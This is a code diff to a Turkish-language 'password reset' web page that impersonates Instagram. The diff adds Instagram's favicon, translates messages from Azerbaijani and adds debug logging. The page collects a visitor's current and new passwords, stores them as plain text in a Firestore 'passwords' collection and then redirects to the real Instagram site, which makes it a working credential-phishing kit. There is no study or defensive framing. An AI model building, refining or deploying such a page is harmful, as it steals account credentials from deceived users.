@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Şifre Yenile</title>
+    <link rel="icon" type="image/x-icon" href="https://www.instagram.com/favicon.ico">
     <script src="https://cdn.tailwindcss.com?client"></script>
     <style>
         .toggle-password {
@@ -98,16 +99,21 @@
         try {
             const app = initializeApp(firebaseConfig);
             db = getFirestore(app);
-            console.log("Firestore uğurla başladı");
+            console.log("Firestore başarıyla başladı");
         } catch (error) {
-            console.error("Firebase başlama xətası:", error);
+            console.error("Firebase başlatma hatası:", error);
         }
 
-        // Göstər/Gizlə funksiyası
+        // Göster/Gizle fonksiyonu
         document.querySelectorAll('.toggle-password').forEach(toggle => {
             toggle.addEventListener('click', () => {
+                console.log("Toggle tıklandı:", toggle.getAttribute('data-target'));
                 const targetId = toggle.getAttribute('data-target');
                 const input = document.getElementById(targetId);
+                if (!input) {
+                    console.error("Input bulunamadı:", targetId);
+                    return;
+                }
                 if (input.type === 'password') {
                     input.type = 'text';
                     toggle.textContent = 'Gizle';
@@ -127,23 +133,26 @@
 
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
+            console.log("Form gönderildi");
             errorMessage.classList.add('hidden');
             successMessage.classList.add('hidden');
 
             if (newPassword.value.length < 6) {
+                console.log("Hata: Yeni şifre 6 karakterden kısa");
                 errorMessage.textContent = 'Yeni şifre en az 6 karakter olmalıdır.';
                 errorMessage.classList.remove('hidden');
                 return;
             }
 
             if (newPassword.value !== confirmPassword.value) {
+                console.log("Hata: Yeni şifre ile tekrar şifre aynı değil");
                 errorMessage.textContent = 'Yeni şifre ile tekrar şifre aynı değil.';
                 errorMessage.classList.remove('hidden');
                 return;
             }
 
             try {
-                // Mevcut şifre ve yeni şifreyi Firestore'a metin olarak yaz
+                console.log("Firestore'a yazılıyor...");
                 const docRef = await addDoc(collection(db, 'passwords'), {
                     currentPassword: currentPassword.value,
                     newPassword: newPassword.value,
@@ -153,6 +162,7 @@
                 successMessage.textContent = 'Şifreniz değiştirildi!';
                 successMessage.classList.remove('hidden');
                 setTimeout(() => {
+                    console.log("Instagram'a yönlendiriliyor...");
                     window.location.href = 'https://www.instagram.com';
                 }, 2000); // 2 saniye sonra Instagram'a yönlendir
             } catch (error) {
